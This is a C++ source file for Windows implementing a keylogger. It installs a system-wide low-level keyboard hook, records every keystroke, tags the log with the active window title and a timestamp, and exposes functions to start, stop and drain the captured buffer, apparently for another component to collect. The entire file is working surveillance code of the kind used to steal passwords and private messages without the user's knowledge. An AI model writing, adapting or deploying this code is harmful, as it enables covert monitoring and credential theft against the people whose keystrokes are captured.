#include "Keylogger.h"
#include <windows.h>
#include <vector>
#include <mutex>
#include <thread>
#include <algorithm>
#include <map>
#include <ctime>
#include <sstream>
#include <atomic>

namespace capture {

    namespace {
        HHOOK hHook = NULL;
        std::mutex logMutex;
        std::string keylogBuffer;
        std::thread loggerThread;
        std::atomic<bool> isLogging = false;
        std::atomic<DWORD> loggerThreadId = 0;
        std::string lastTitle;

        std::string GetActiveWindowTitle() {
            char title[256];
            HWND hwnd = GetForegroundWindow();
            GetWindowTextA(hwnd, title, sizeof(title));
            return std::string(title);
        }

        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
            if (nCode >= 0 && wParam == WM_KEYDOWN) {
                KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;

                std::lock_guard<std::mutex> lock(logMutex);

                std::string currentTitle = GetActiveWindowTitle();
                if (currentTitle != lastTitle) {
                    lastTitle = currentTitle;

                    time_t now = time(0);
                    char dt[26];
                    ctime_s(dt, sizeof(dt), &now);
                    std::string timestamp = dt;
                    if (!timestamp.empty() && timestamp.back() == '\n') timestamp.pop_back();

                    keylogBuffer += "\n\n--- [Active Window: " + currentTitle + " at " + timestamp + "] ---\n";
                }

                DWORD vkCode = kbd->vkCode;

                if (vkCode == VK_RETURN) keylogBuffer += "[ENTER]\n";
                else if (vkCode == VK_BACK) keylogBuffer += "[BACKSPACE]";
                else if (vkCode == VK_SPACE) keylogBuffer += " ";
                else if (vkCode == VK_TAB) keylogBuffer += "[TAB]";
                else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {}
                else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) {}
                else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) {}
                else {
                    BYTE keyboardState[256];
                    GetKeyboardState(keyboardState);

                    wchar_t buffer[5];
                    int result = ToUnicode(vkCode, kbd->scanCode, keyboardState, buffer, 4, 0);
                    if (result > 0) {
                        buffer[result] = 0;
                        char narrowBuffer[5];
                        WideCharToMultiByte(CP_UTF8, 0, buffer, -1, narrowBuffer, sizeof(narrowBuffer), NULL, NULL);
                        keylogBuffer += narrowBuffer;
                    }
                }
            }
            return CallNextHookEx(hHook, nCode, wParam, lParam);
        }

        void LoggerLoop() {
            loggerThreadId = GetCurrentThreadId();
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

            MSG msg;
            while (GetMessage(&msg, NULL, 0, 0) > 0) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }

            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }
    }

    void StartKeylogger() {
        if (isLogging) return;
        isLogging = true;
        loggerThread = std::thread(LoggerLoop);
    }

    void StopKeylogger() {
        if (!isLogging) return;

        if (hHook) {
            UnhookWindowsHookEx(hHook);
            hHook = NULL;
        }

        isLogging = false;
        if (loggerThreadId != 0) {
            PostThreadMessage(loggerThreadId, WM_QUIT, 0, 0);
        }
        if (loggerThread.joinable()) {
            loggerThread.join();
        }
        loggerThreadId = 0;
    }

    std::string GetAndClearKeylog() {
        std::lock_guard<std::mutex> lock(logMutex);
        if (keylogBuffer.empty()) return "";
        std::string logs = keylogBuffer;
        keylogBuffer.clear();
        return logs;
    }

}
